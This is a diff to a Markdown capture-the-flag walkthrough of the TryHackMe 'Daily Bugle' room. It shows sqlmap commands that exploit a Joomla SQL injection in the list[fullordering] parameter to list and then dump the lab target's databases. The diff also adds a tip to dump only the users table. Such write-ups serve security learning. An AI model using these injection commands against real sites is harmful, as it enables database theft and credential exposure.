@@ -108,10 +108,13 @@ We're going to open up a new terminal and try the below command.<br />
 sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 ```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT13.png?raw=true)<br />
-Success! We were able to get the database names, now let's dump the whole database and check the findings! We will use a similar command except replace --dbs with --dump-all<br />
+Success! We were able to get the database names, now let's dump the whole database and check the findings! We will use a similar command except replace --dbs with --dump-all. This will take a while so be patient.<br />
+This is not the best way to complete the CTF challenge, you could just dump the users instead of the whole database. To do this check SQLMaps syntax.<br />
 ```shell
 sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
 ```
+If you receive any messages or requests during the process just follow what I did below.<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT14.png?raw=true)<br />
 
 
 
